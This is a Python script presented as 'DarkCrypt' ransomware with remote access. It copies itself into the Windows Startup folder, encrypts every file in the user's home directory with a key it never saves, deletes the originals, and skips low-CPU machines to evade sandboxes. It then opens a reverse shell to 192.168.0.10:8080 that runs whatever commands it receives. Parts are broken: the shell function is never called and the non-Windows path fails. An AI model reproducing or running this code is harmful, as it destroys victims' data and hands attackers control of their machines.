# Linux DarkCrypt with SSH Remote Acces
import os
import subprocess
import sys
import time
import shutil

# Copy archive
script_path = os.path.abspath(__file__)
osystem = sys.platform
if osystem == 'win32' or osystem == 'cygwin':
    destino = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
else:
    pass

destino_path = os.path.join(destino, os.path.basename(script_path))
try:
    shutil.copy(script_path, destino_path)

except Exception as e:
    sys.exit()


# Encrypter code
# Import coder
from cryptography.fernet import Fernet
import os

# Generate Key
key = Fernet.generate_key()

# Encrypter
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_file_path = file_path + ".zlo"
    with open(encrypted_file_path, "wb") as file:
        file.write(encrypted_data)
    os.remove(file_path)


User_PC = os.path.expanduser('~')

for file in os.listdir(User_PC):
    file_path = os.path.join(User_PC, file)
    if os.path.isfile(file_path):
        encrypt_file(file_path, key)

# Reverse Shell
import os
import socket
import subprocess

if os.cpu_count() <= 2:
    quit()

HOST = '192.168.0.10'  
PORT = 8080 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!")) 
print('\n')

def reverse():
    try:
        s.send(str.encode(os.getcwd() + "> "))
        print('\n')
        
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        
        if data == "quit": 
            sys.exit()
        
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            output_str = stdout_value.decode("cp437") + stderr_value.decode("cp437")
            
            s.send(str.encode(output_str + os.getcwd() + "> "))
    except Exception as e:
        s.send(str.encode("Error occurred: " + str(e) + "\n"))
        time.sleep(10)
        reverse()
    
s.close()

Desc = 'desc'
while True:
    os.system(f'echo {Desc}')
